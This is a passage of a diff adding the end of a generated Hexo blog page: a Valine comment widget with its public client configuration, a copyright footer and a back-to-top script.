+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+  
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <div id="comment-card" class="comment-card">
+    <div class="main-title-bar">
+      <div class="main-title-dot"></div>
+      <div class="main-title">Comments </div>
+    </div>
+    <div id="vcomments"></div>
+  </div>
+  <script>
+      new Valine({"enable":true,"appId":"RxUcUDCs4PkrAVfsPEoMi8VU-gzGzoHsz","appKey":"P8P94qqk5PEJXgLeEEh2qJTr","placeholder":"大家可以在上面留下你的github网址，一起交流学习呀～Everyone can leave your Github URL at the above website, and let's communicate and learn together~","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
+  </script>
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2025 Ruofan Wang<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
